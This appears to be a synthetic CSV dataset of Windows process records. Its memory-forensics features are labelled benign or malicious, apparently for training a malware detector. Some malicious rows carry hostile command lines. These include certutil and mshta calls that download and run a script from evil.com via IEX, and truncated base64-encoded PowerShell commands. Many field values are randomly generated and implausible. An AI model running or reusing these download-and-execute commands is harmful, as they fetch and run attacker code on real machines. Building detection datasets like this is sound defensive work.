process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
svchost.exe,9060,3435,C:\Windows\System32\svchost.exe,36,10,116,142.37,49.91,1,0,82,0,6,4,0.882,1,181,0,0,1,1,0,0,0,0,3,0.5778,1
RuntimeBroker.exe,5931,2439,C:\Windows\System32\RuntimeBroker.exe,46,30,60,26.86,52.07,0,1,28,0,0,0,0.34,0,119,0,0,0,0,0,0,0,0,0,0.0125,0
SearchIndexer.exe,8895,6775,C:\Windows\System32\SearchIndexer.exe,103,7,375,65.61,93.48,1,1,39,0,0,0,0.204,0,76,0,0,0,0,0,0,0,0,0,0.0635,0
MsMpEng.exe,9068,8592,"""C:\Program Files\Windows Defender\MsMpEng.exe""",70,15,381,76.51,68.73,0,1,22,0,0,0,0.335,0,49,0,0,0,0,0,0,0,0,0,0.1375,0
wmiprvse.exe,8873,7092,wmiprvse.exe -secured -Embedding,30,10,206,20.66,93.74,1,1,31,1,3,1,0.755,1,51,0,0,0,0,0,0,1,0,1,0.6715,1
MsMpEng.exe,2752,1489,"""C:\Program Files\Windows Defender\MsMpEng.exe""",46,2,264,174.02,88.34,1,1,28,0,0,0,0.181,0,115,0,0,0,0,0,0,0,0,0,0.043,0
notepad.exe,4676,1892,C:\Windows\System32\notepad.exe,33,6,122,32.55,52.35,1,0,4,1,3,2,0.851,1,81,1,1,0,0,0,0,0,1,4,0.904,1
notepad.exe,8455,5277,C:\Windows\System32\notepad.exe,65,8,101,101.4,74.65,0,1,46,0,0,0,0.305,0,83,0,0,0,0,0,0,0,0,0,0.0233,0
svchost.exe,1095,8481,wmiprvse.exe -secured -Embedding,73,5,106,77.23,46.12,1,1,24,0,3,3,0.664,1,178,1,0,0,0,0,0,1,0,2,0.7916,1
chrome.exe,9520,2391,chrome.exe --type=renderer --disable-gpu,80,31,442,70.4,86.06,0,1,76,1,5,0,0.233,0,59,0,0,0,0,0,0,0,0,0,0.0974,0
winlogon.exe,9879,5374,C:\Windows\System32\winlogon.exe,101,30,63,67.78,46.94,1,1,32,0,0,0,0.085,0,109,0,0,0,0,0,0,0,0,0,0.0037,0
explorer.exe,7456,1300,C:\Windows\Explorer.EXE,25,3,360,35.99,22.48,1,1,20,0,0,0,0.05,0,21,0,0,0,0,0,0,0,0,0,0.0058,0
csrss.exe,641,8299,C:\Windows\System32\csrss.exe,66,6,97,40.36,28.63,1,1,42,0,0,0,0.275,0,68,0,0,0,0,0,0,0,0,0,0.1489,0
WmiPrvSE.exe,9322,1746,wmiprvse.exe -secured -Embedding,82,8,206,29.42,94.29,1,1,36,1,0,3,0.501,1,175,0,0,0,0,0,0,1,0,1,0.6728,1
SearchIndexer.exe,2127,732,C:\Windows\System32\SearchIndexer.exe,22,30,462,38.82,6.63,1,1,45,0,0,0,0.111,0,64,0,0,0,0,0,0,0,0,0,0.1049,0
OneDrive.exe,4182,2539,C:\Windows\System32\OneDrive.exe,109,30,323,136.64,12.68,0,1,55,0,0,0,0.342,0,108,0,0,0,0,0,0,0,0,0,0.0665,0
lsass.exe,4065,8946,C:\Windows\System32\lsass.exe,44,25,489,90.56,95.03,0,1,54,0,0,0,0.32,0,63,0,0,0,0,0,0,0,0,0,0.1303,0
certutil.exe,7997,593,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),120,2,102,19.94,28.73,1,1,27,1,2,1,0.575,1,106,1,0,0,0,1,1,0,0,2,0.4873,1
mshta.exe,8483,9998,mshta.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),146,2,83,10.26,52.29,1,1,28,1,4,0,0.509,0,119,1,0,0,0,1,1,0,0,3,0.5054,1
System,4,4123,C:\Windows\System32\System,59,32,430,53.03,63.7,1,1,15,0,0,0,0.071,0,32,0,0,0,0,0,0,0,0,0,0.149,0
powershell.exe,2393,9779,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...EFygX+aF9i543FJ+4qVLJYkyg4z0Jmb0VY=9FnLGIT8a7D3svJBhHNHQZaiAE/qChfon6NOJwybWT0IwYNMJs6r3QH3408WzN3=mcQXHN1e=CdOzVDO7BbFPPm3+0=dGRt,213,3,89,27.65,46.58,1,1,20,1,2,2,0.566,0,110,1,0,0,0,1,1,0,0,4,0.7284,1
lsass.exe,1582,6279,C:\Windows\System32\lsass.exe,44,20,93,130.04,78.39,1,1,51,0,0,0,0.199,0,66,0,0,0,0,0,0,0,0,0,0.0227,0
System,4,2621,C:\Windows\System32\System,42,16,253,2.11,78.04,1,1,79,0,0,0,0.209,0,66,0,0,0,0,0,0,0,0,0,0.0589,0
WmiPrvSE.exe,4240,1806,wmiprvse.exe -secured -Embedding,37,9,251,88.95,62.76,1,1,24,1,0,3,0.748,1,109,1,0,0,0,0,0,1,0,3,0.6359,1
smss.exe,2774,4,C:\Windows\System32\smss.exe,35,8,116,182.76,52.03,0,1,30,0,0,0,0.097,0,72,0,0,0,0,0,0,0,0,0,0.0372,0
MsMpEng.exe,7347,7972,"""C:\Program Files\Windows Defender\MsMpEng.exe""",37,17,61,32.88,90.31,1,1,79,0,0,0,0.196,0,24,0,0,0,0,0,0,0,0,0,0.116,0
services.exe,3842,8375,C:\Windows\System32\services.exe,42,38,299,113.2,26.11,0,1,17,0,0,0,0.19,0,82,0,0,0,0,0,0,0,0,0,0.0556,0
notepad.exe,4369,9503,C:\Windows\System32\notepad.exe,35,6,320,164.25,128.23,1,0,123,0,3,6,0.811,1,134,0,0,1,1,0,0,0,0,3,0.5942,1
services.exe,2736,976,C:\Windows\System32\services.exe,103,12,332,29.03,2.8,0,1,8,0,0,0,0.321,0,60,0,0,0,0,0,0,0,0,0,0.1211,0
csrss.exe,3899,2896,C:\Windows\System32\csrss.exe,25,19,190,196.46,96.45,1,1,15,0,0,0,0.264,0,27,0,0,0,0,0,0,0,0,0,0.1036,0
taskmgr.exe,5519,6903,C:\Windows\System32\taskmgr.exe,22,30,447,49.57,57.62,1,1,56,0,0,0,0.068,0,28,0,0,0,0,0,0,0,0,0,0.0497,0
OneDrive.exe,4952,1504,C:\Windows\System32\OneDrive.exe,90,15,367,62.21,7.02,1,1,40,0,0,0,0.173,0,65,0,0,0,0,0,0,0,0,0,0.0589,0
wininit.exe,5669,5202,C:\Windows\System32\wininit.exe,116,34,94,30.97,1.36,0,1,13,0,0,0,0.279,0,24,0,0,0,0,0,0,0,0,0,0.1481,0
taskmgr.exe,6047,5590,C:\Windows\System32\taskmgr.exe,113,24,482,75.52,10.56,1,1,34,0,0,0,0.195,0,101,0,0,0,0,0,0,0,0,0,0.0847,0
notepad.exe,6101,9644,C:\Windows\System32\notepad.exe,97,10,322,132.04,83.04,1,1,6,0,0,0,0.116,0,111,0,0,0,0,0,0,0,0,0,0.0845,0
explorer.exe,8091,2621,C:\Windows\Explorer.EXE,111,31,226,129.78,42.26,1,1,18,0,0,0,0.059,0,101,0,0,0,0,0,0,0,0,0,0.0974,0
taskmgr.exe,1485,1377,C:\Windows\System32\taskmgr.exe,23,18,116,71.33,38.79,1,1,41,0,0,0,0.286,0,22,0,0,0,0,0,0,0,0,0,0.1399,0
firefox.exe,6222,4677,C:\Windows\System32\firefox.exe,96,6,455,145.41,7.33,0,1,56,1,13,0,0.277,0,25,0,0,0,0,0,0,0,0,0,0.1078,0
wininit.exe,3751,3765,C:\Windows\System32\wininit.exe,100,28,87,32.82,39.53,0,1,62,0,0,0,0.33,0,30,0,0,0,0,0,0,0,0,0,0.0978,0
svchost.exe,7721,8449,C:\Windows\System32\svchost.exe,53,14,333,117.36,144.63,1,0,125,0,5,2,0.748,1,244,0,0,1,0,0,0,0,0,3,0.8027,1
svchost.exe,9260,2917,C:\Windows\system32\svchost.exe -k netsvcs,103,8,412,157.6,66.65,0,1,40,0,0,0,0.284,0,90,0,0,0,0,0,0,0,0,0,0.0688,0
firefox.exe,5777,5284,C:\Windows\System32\firefox.exe,86,16,134,53.12,62.88,0,1,29,0,5,0,0.21,0,54,0,0,0,0,0,0,0,0,0,0.1158,0
powershell.exe,6462,821,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA.../z9D7UswbBPbnj=VYXsEtkipRFxW1MQGRwba/+J6yz/z0ux9XKQD0dO/4TIo7/ztbgpiDX6hlOM=9OLtThvcTKoo2j=XZR3cec70mzxFnF4TsDEb4Mdfz1JlYs+,206,9,169,78.12,65.51,1,1,28,1,2,1,0.591,1,71,0,0,0,0,1,1,0,0,3,0.6078,1
powershell.exe,2155,2112,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...,112,3,111,22.06,9.1,1,1,37,1,4,0,0.761,1,61,1,0,0,0,1,1,0,0,3,0.5607,1
lsass.exe,2731,6750,C:\Windows\System32\lsass.exe,58,27,426,145.59,93.64,0,1,18,0,0,0,0.109,0,80,0,0,0,0,0,0,0,0,0,0.1019,0
powershell.exe,811,1039,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...oZFCaCIBbaR7UG10CzwbF0W4VyQIZLE+1js0K5LUs7=muT=jcx5hS79XH/+V2L+YT/Y=uDikxO6dD+5=1vk2c0IXhB3+xej9E3WBnO,185,5,199,35.41,78.12,1,1,46,1,3,1,0.816,0,127,1,0,0,0,1,1,0,0,3,0.9199,1
RuntimeBroker.exe,8934,9666,C:\Windows\System32\RuntimeBroker.exe,48,1,67,5.51,30.78,1,1,78,0,0,0,0.257,0,107,0,0,0,0,0,0,0,0,0,0.0258,0
smss.exe,8197,4,C:\Windows\System32\smss.exe,25,2,257,34.21,19.34,0,1,22,0,0,0,0.284,0,89,0,0,0,0,0,0,0,0,0,0.0574,0
MsMpEng.exe,1232,7268,"""C:\Program Files\Windows Defender\MsMpEng.exe""",112,29,64,146.77,95.0,0,1,71,0,0,0,0.285,0,94,0,0,0,0,0,0,0,0,0,0.1051,0
spoolsv.exe,3259,4690,C:\Windows\System32\spoolsv.exe,52,23,111,110.31,44.94,1,1,43,0,0,0,0.115,0,84,0,0,0,0,0,0,0,0,0,0.0958,0
lsass.exe,9361,8213,C:\Windows\System32\lsass.exe,41,10,139,24.83,24.27,0,1,47,0,0,0,0.146,0,50,0,0,0,0,0,0,0,0,0,0.0263,0
mspaint.exe,8929,1267,C:\Windows\System32\mspaint.exe,42,5,114,124.09,101.65,1,0,5,1,7,1,0.706,1,77,1,1,0,0,0,0,0,1,3,0.8491,1
MsMpEng.exe,4705,7917,"""C:\Program Files\Windows Defender\MsMpEng.exe""",103,19,418,78.99,35.18,0,1,48,0,0,0,0.189,0,111,0,0,0,0,0,0,0,0,0,0.0775,0
smss.exe,5713,4,C:\Windows\System32\smss.exe,119,5,92,145.84,97.68,0,1,28,0,0,0,0.188,0,37,0,0,0,0,0,0,0,0,0,0.0077,0
winlogon.exe,3289,3058,C:\Windows\System32\winlogon.exe,88,36,144,90.74,57.52,1,1,79,0,0,0,0.058,0,28,0,0,0,0,0,0,0,0,0,0.0526,0
notepad.exe,5396,7913,C:\Windows\System32\notepad.exe,45,8,276,150.3,46.74,0,1,32,0,0,0,0.116,0,82,0,0,0,0,0,0,0,0,0,0.1127,0
powershell.exe,6480,8087,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...ALaHhZVsaRtZ+=R5TnMPrIB=O9b5XNu57F5V5rxSJzozbuDR3v0Z6LExjE4HxF=16PJaVPivJl3yhS3ie=v0X,153,4,155,90.59,61.26,1,1,51,1,3,2,0.781,0,90,0,0,0,0,1,1,0,0,2,0.6271,1
MsMpEng.exe,2269,3674,"""C:\Program Files\Windows Defender\MsMpEng.exe""",45,7,133,128.92,7.45,1,1,51,0,0,0,0.24,0,31,0,0,0,0,0,0,0,0,0,0.0857,0
notepad.exe,1480,4377,C:\Windows\System32\notepad.exe,54,13,269,156.99,155.11,1,0,138,0,3,4,0.601,1,98,0,0,1,0,0,0,0,0,2,0.7911,1
System,4,2226,C:\Windows\System32\System,27,5,273,112.61,10.33,0,1,37,0,0,0,0.194,0,30,0,0,0,0,0,0,0,0,0,0.0663,0
WmiPrvSE.exe,9495,9404,wmiprvse.exe -secured -Embedding,55,11,198,46.7,98.95,1,1,31,0,0,3,0.58,0,137,0,0,0,0,0,0,1,0,3,0.8075,1
svchost.exe,9765,2887,C:\Windows\System32\svchost.exe,57,15,145,283.56,120.61,1,0,109,1,4,7,0.663,1,165,0,0,1,1,0,0,0,0,3,0.9197,1
spoolsv.exe,4405,8387,C:\Windows\System32\spoolsv.exe,97,22,82,8.25,44.6,1,1,51,0,0,0,0.311,0,111,0,0,0,0,0,0,0,0,0,0.0295,0
wininit.exe,8590,5020,C:\Windows\System32\wininit.exe,40,32,148,103.64,93.65,1,1,78,0,0,0,0.121,0,76,0,0,0,0,0,0,0,0,0,0.023,0
conhost.exe,4926,4246,C:\Windows\System32\conhost.exe,85,11,495,52.94,66.65,0,1,68,0,0,0,0.098,0,52,0,0,0,0,0,0,0,0,0,0.0018,0
wininit.exe,2279,2849,C:\Windows\System32\wininit.exe,112,12,426,16.27,19.87,0,1,5,0,0,0,0.184,0,106,0,0,0,0,0,0,0,0,0,0.0249,0
spoolsv.exe,5785,2188,C:\Windows\System32\spoolsv.exe,73,25,413,23.59,65.49,1,1,41,0,0,0,0.222,0,94,0,0,0,0,0,0,0,0,0,0.1359,0
System,4,7462,C:\Windows\System32\System,102,7,366,169.89,19.47,0,1,28,0,0,0,0.074,0,102,0,0,0,0,0,0,0,0,0,0.0734,0
RuntimeBroker.exe,4762,9087,C:\Windows\System32\RuntimeBroker.exe,81,38,273,112.65,40.46,1,1,38,0,0,0,0.208,0,93,0,0,0,0,0,0,0,0,0,0.1464,0
explorer.exe,413,7588,C:\Windows\System32\explorer.exe,36,13,211,288.26,175.3,1,0,126,0,5,3,0.762,1,138,0,0,1,0,0,0,0,0,3,0.576,1
MsMpEng.exe,6363,1996,"""C:\Program Files\Windows Defender\MsMpEng.exe""",22,3,316,89.61,67.7,1,1,9,0,0,0,0.347,0,104,0,0,0,0,0,0,0,0,0,0.0243,0
winlogon.exe,6380,4346,C:\Windows\System32\winlogon.exe,38,4,322,112.55,40.75,1,1,18,0,0,0,0.172,0,27,0,0,0,0,0,0,0,0,0,0.1299,0
OneDrive.exe,8146,8104,C:\Windows\System32\OneDrive.exe,61,20,190,132.98,24.1,1,1,29,0,0,0,0.125,0,106,0,0,0,0,0,0,0,0,0,0.1446,0
notepad.exe,938,8277,C:\Windows\System32\notepad.exe,108,39,298,43.14,82.04,1,1,42,0,0,0,0.06,0,82,0,0,0,0,0,0,0,0,0,0.1426,0
lsass.exe,4458,9127,C:\Windows\System32\lsass.exe,61,10,386,160.48,49.38,0,1,71,0,0,0,0.093,0,76,0,0,0,0,0,0,0,0,0,0.0144,0
WmiPrvSE.exe,5950,7747,wmiprvse.exe -secured -Embedding,76,7,108,40.02,40.58,1,1,45,0,1,3,0.564,1,52,1,0,0,0,0,0,1,0,1,0.5122,1
notepad.exe,3069,1188,C:\Windows\System32\notepad.exe,77,38,377,57.34,81.79,1,1,74,0,0,0,0.204,0,88,0,0,0,0,0,0,0,0,0,0.0634,0
powershell.exe,6221,5846,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...iSURuSoNr3WMv1ffrNhd8ySIf2cDiwlJbBuKE9u6xpYjIKncVFYYA4koDG6gCHmE9hSN7l58Md+,158,8,130,70.67,23.6,1,1,40,1,2,0,0.59,0,111,0,0,0,0,1,1,0,0,3,0.7645,1
chrome.exe,2772,3952,chrome.exe --type=renderer --disable-gpu,114,31,479,3.78,0.72,1,1,55,1,6,0,0.104,0,50,0,0,0,0,0,0,0,0,0,0.092,0
notepad.exe,7346,2801,C:\Windows\System32\notepad.exe,38,12,377,85.26,137.11,1,0,149,1,4,3,0.623,1,150,0,0,1,0,0,0,0,0,1,0.6433,1
services.exe,2157,7189,C:\Windows\System32\services.exe,26,10,401,149.85,81.6,0,1,38,0,0,0,0.296,0,47,0,0,0,0,0,0,0,0,0,0.0541,0
OneDrive.exe,1359,2636,C:\Windows\System32\OneDrive.exe,42,19,173,6.21,24.65,0,1,32,0,0,0,0.207,0,55,0,0,0,0,0,0,0,0,0,0.1325,0
wmiprvse.exe,5548,4214,wmiprvse.exe -secured -Embedding,39,8,159,23.09,33.92,1,1,29,0,3,3,0.537,1,103,1,0,0,0,0,0,1,0,2,0.6797,1
System,4,2522,C:\Windows\System32\System,65,11,59,198.82,87.73,0,1,73,0,0,0,0.135,0,93,0,0,0,0,0,0,0,0,0,0.0639,0
System,4,5037,C:\Windows\System32\System,32,31,334,79.19,92.22,1,1,28,0,0,0,0.268,0,91,0,0,0,0,0,0,0,0,0,0.099,0
spoolsv.exe,2107,4742,C:\Windows\System32\spoolsv.exe,111,13,429,195.66,74.63,1,1,62,0,0,0,0.279,0,30,0,0,0,0,0,0,0,0,0,0.0685,0
lsass.exe,9443,1816,C:\Windows\System32\lsass.exe,70,15,286,6.36,55.56,0,1,43,0,0,0,0.344,0,118,0,0,0,0,0,0,0,0,0,0.0506,0
powershell.exe,1046,2279,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...yaUz3TkUGM/sqU96ami0XnPsEUe3f0chD+SvX8TckhbbD6fU67r5JFRe63YUZAZxC,133,3,46,89.0,31.39,1,1,22,1,4,1,0.683,0,111,0,0,0,0,1,1,0,0,2,0.6197,1
System,4,5739,C:\Windows\System32\System,21,26,84,99.64,65.63,0,1,32,0,0,0,0.121,0,73,0,0,0,0,0,0,0,0,0,0.1243,0
System,4,3883,C:\Windows\System32\System,61,34,469,83.31,78.5,1,1,36,0,0,0,0.331,0,103,0,0,0,0,0,0,0,0,0,0.0618,0
OneDrive.exe,7358,3001,C:\Windows\System32\OneDrive.exe,28,19,379,22.92,98.12,0,1,51,0,0,0,0.108,0,64,0,0,0,0,0,0,0,0,0,0.0855,0
notepad.exe,2024,1768,C:\Windows\System32\notepad.exe,53,19,196,191.16,101.06,1,0,86,1,2,3,0.784,1,204,0,0,1,1,0,0,0,0,2,0.6925,1
csrss.exe,587,1878,C:\Windows\System32\csrss.exe,49,10,180,111.3,62.38,0,1,50,0,0,0,0.237,0,112,0,0,0,0,0,0,0,0,0,0.104,0
svchost.exe,6501,1918,C:\Windows\System32\svchost.exe,45,6,97,144.59,48.34,1,0,7,1,3,1,0.724,1,167,1,1,0,0,0,0,0,1,2,0.693,1
notepad.exe,906,6186,C:\Windows\System32\notepad.exe,34,16,292,125.3,132.03,1,0,73,1,2,7,0.667,1,197,0,0,1,1,0,0,0,0,1,0.8267,1
MsMpEng.exe,2360,2411,"""C:\Program Files\Windows Defender\MsMpEng.exe""",91,7,326,56.37,10.4,1,1,50,0,0,0,0.07,0,94,0,0,0,0,0,0,0,0,0,0.0091,0
explorer.exe,4534,1343,C:\Windows\Explorer.EXE,100,30,434,159.42,10.28,1,1,78,0,0,0,0.054,0,111,0,0,0,0,0,0,0,0,0,0.1189,0
SearchIndexer.exe,6387,6383,C:\Windows\System32\SearchIndexer.exe,102,37,435,67.45,9.81,0,1,26,0,0,0,0.303,0,72,0,0,0,0,0,0,0,0,0,0.145,0
services.exe,7086,7045,C:\Windows\System32\services.exe,62,18,272,119.8,88.98,1,1,11,0,0,0,0.155,0,26,0,0,0,0,0,0,0,0,0,0.1478,0
MsMpEng.exe,2436,5240,"""C:\Program Files\Windows Defender\MsMpEng.exe""",26,3,265,114.15,20.73,0,1,26,0,0,0,0.284,0,80,0,0,0,0,0,0,0,0,0,0.0207,0
spoolsv.exe,872,4527,C:\Windows\System32\spoolsv.exe,72,17,64,123.26,37.68,0,1,53,0,0,0,0.083,0,61,0,0,0,0,0,0,0,0,0,0.0372,0
WmiPrvSE.exe,4970,3664,wmiprvse.exe -secured -Embedding,73,8,266,90.17,23.67,1,1,37,0,3,2,0.643,1,148,0,0,0,0,0,0,1,0,2,0.7955,1
calc.exe,2510,8652,C:\Windows\System32\calc.exe,34,11,335,43.1,88.62,0,1,37,0,0,0,0.247,0,56,0,0,0,0,0,0,0,0,0,0.0584,0
winlogon.exe,9392,1447,C:\Windows\System32\winlogon.exe,100,12,456,68.69,82.27,1,1,33,0,0,0,0.081,0,35,0,0,0,0,0,0,0,0,0,0.0754,0
RuntimeBroker.exe,948,928,C:\Windows\System32\RuntimeBroker.exe,106,38,422,12.25,30.16,1,1,10,0,0,0,0.059,0,39,0,0,0,0,0,0,0,0,0,0.1075,0
notepad.exe,3514,1222,C:\Windows\System32\notepad.exe,52,7,382,137.59,71.28,1,0,54,0,5,4,0.691,1,145,0,0,1,1,0,0,0,0,3,0.8217,1
wininit.exe,8291,9586,C:\Windows\System32\wininit.exe,57,22,360,165.52,90.95,0,1,17,0,0,0,0.219,0,113,0,0,0,0,0,0,0,0,0,0.0663,0
spoolsv.exe,2086,7567,C:\Windows\System32\spoolsv.exe,28,5,233,162.37,34.36,0,1,70,0,0,0,0.132,0,88,0,0,0,0,0,0,0,0,0,0.046,0
powershell.exe,2974,8113,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...yZ0PhAgJtxBdv90jzP+i0UawEjwqvFeceOlsRpRPVXF4g59xGw8etk1OQv1cninVJBfjFk4NME4H998jTmd94mOqQDfpayVuzuAb/PXL7YMmabVlPNgWuauEtDd9rehJvhkY0eleEuXD4g4+RYoL6l,233,8,114,71.82,61.74,1,1,35,1,5,1,0.55,0,64,0,0,0,0,1,1,0,0,4,0.7059,1
RuntimeBroker.exe,4172,633,C:\Windows\System32\RuntimeBroker.exe,117,18,136,44.94,65.78,1,1,26,0,0,0,0.27,0,20,0,0,0,0,0,0,0,0,0,0.0826,0
explorer.exe,1517,462,C:\Windows\Explorer.EXE,33,10,171,177.08,66.51,0,1,13,0,0,0,0.3,0,77,0,0,0,0,0,0,0,0,0,0.0635,0
MsMpEng.exe,5773,4480,"""C:\Program Files\Windows Defender\MsMpEng.exe""",25,28,330,62.06,43.45,0,1,46,0,0,0,0.216,0,78,0,0,0,0,0,0,0,0,0,0.0659,0
spoolsv.exe,4712,955,C:\Windows\System32\spoolsv.exe,45,14,194,57.41,57.6,1,1,18,0,0,0,0.191,0,39,0,0,0,0,0,0,0,0,0,0.0192,0
RuntimeBroker.exe,1380,5542,C:\Windows\System32\RuntimeBroker.exe,90,26,142,59.92,87.63,0,1,26,0,0,0,0.189,0,71,0,0,0,0,0,0,0,0,0,0.1308,0
lsass.exe,6801,8565,C:\Windows\System32\lsass.exe,101,31,397,79.52,38.99,0,1,46,0,0,0,0.171,0,48,0,0,0,0,0,0,0,0,0,0.0927,0
powershell.exe,7294,4999,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...9FQ+0lZ3cqZxRuwqzJkArU/TQyPu1t63DTxN4fQ6z813jqu4OLeoF4eb0Y6/T3svcHaPlr9qh7X871Gy/HNbrYkefI5uC5QsRzP60syiyGvntjKgCXsoxPbKHlS0DzhlaXlH3Ud,223,7,118,95.71,34.49,1,1,50,1,2,1,0.592,0,123,0,0,0,0,1,1,0,0,4,0.8792,1
wininit.exe,7153,778,C:\Windows\System32\wininit.exe,92,37,310,142.39,19.94,1,1,75,0,0,0,0.157,0,61,0,0,0,0,0,0,0,0,0,0.1048,0
explorer.exe,7446,2760,C:\Windows\Explorer.EXE,98,13,55,102.44,50.97,0,1,37,0,0,0,0.152,0,103,0,0,0,0,0,0,0,0,0,0.0791,0
calc.exe,9421,2215,C:\Windows\System32\calc.exe,119,22,353,64.11,65.57,1,1,69,0,0,0,0.201,0,68,0,0,0,0,0,0,0,0,0,0.0135,0
explorer.exe,1037,2082,C:\Windows\System32\explorer.exe,76,3,185,44.09,91.75,1,0,7,1,6,1,0.888,1,56,1,1,0,0,0,0,0,1,4,0.75,1
taskmgr.exe,811,2209,C:\Windows\System32\taskmgr.exe,29,32,256,109.86,82.08,1,1,16,0,0,0,0.192,0,71,0,0,0,0,0,0,0,0,0,0.1298,0
mshta.exe,2952,4151,mshta.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),219,5,62,56.87,29.28,1,1,23,1,1,0,0.59,1,66,1,0,0,0,1,1,0,0,2,0.5471,1
notepad.exe,1300,6185,C:\Windows\System32\notepad.exe,113,10,244,49.35,36.41,1,1,55,0,0,0,0.098,0,91,0,0,0,0,0,0,0,0,0,0.0239,0
certutil.exe,8140,2506,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),128,1,106,48.87,32.22,1,1,38,1,3,2,0.533,1,64,1,0,0,0,1,1,0,0,4,0.8875,1
certutil.exe,5463,2130,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),245,4,51,27.72,11.01,1,1,38,1,3,2,0.518,1,76,1,0,0,0,0,1,0,0,2,0.7986,1
powershell.exe,4450,3311,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...EmMjd6hENDzBIBaQN8/1gJM3pVYcL93eCzIIgm8EJR/6zvjrZyXp0q,122,5,132,45.75,22.99,1,1,30,1,3,0,0.82,1,126,0,0,0,0,1,1,0,0,2,0.8758,1
smss.exe,4760,4,C:\Windows\System32\smss.exe,62,35,348,141.63,76.45,0,1,20,0,0,0,0.201,0,49,0,0,0,0,0,0,0,0,0,0.0334,0
wininit.exe,7757,2290,C:\Windows\System32\wininit.exe,20,3,495,167.27,9.35,1,1,27,0,0,0,0.067,0,22,0,0,0,0,0,0,0,0,0,0.128,0
RuntimeBroker.exe,5964,7611,C:\Windows\System32\RuntimeBroker.exe,116,28,207,122.49,28.48,0,1,15,0,0,0,0.338,0,82,0,0,0,0,0,0,0,0,0,0.1438,0
spoolsv.exe,1605,3015,C:\Windows\System32\spoolsv.exe,99,5,238,3.38,98.61,0,1,32,0,0,0,0.232,0,79,0,0,0,0,0,0,0,0,0,0.1438,0
lsass.exe,1143,8983,C:\Windows\System32\lsass.exe,110,37,442,163.17,75.01,0,1,13,0,0,0,0.326,0,86,0,0,0,0,0,0,0,0,0,0.0612,0
wininit.exe,2315,5540,C:\Windows\System32\wininit.exe,53,38,203,6.31,1.03,0,1,49,0,0,0,0.315,0,59,0,0,0,0,0,0,0,0,0,0.123,0
csrss.exe,5904,4124,C:\Windows\System32\csrss.exe,61,26,88,111.54,80.3,0,1,74,0,0,0,0.297,0,43,0,0,0,0,0,0,0,0,0,0.0559,0
explorer.exe,3347,6513,C:\Windows\Explorer.EXE,75,19,344,132.02,84.45,0,1,53,0,0,0,0.201,0,22,0,0,0,0,0,0,0,0,0,0.0755,0
smss.exe,4326,4,C:\Windows\System32\smss.exe,110,26,80,54.89,70.97,1,1,42,0,0,0,0.215,0,49,0,0,0,0,0,0,0,0,0,0.0574,0
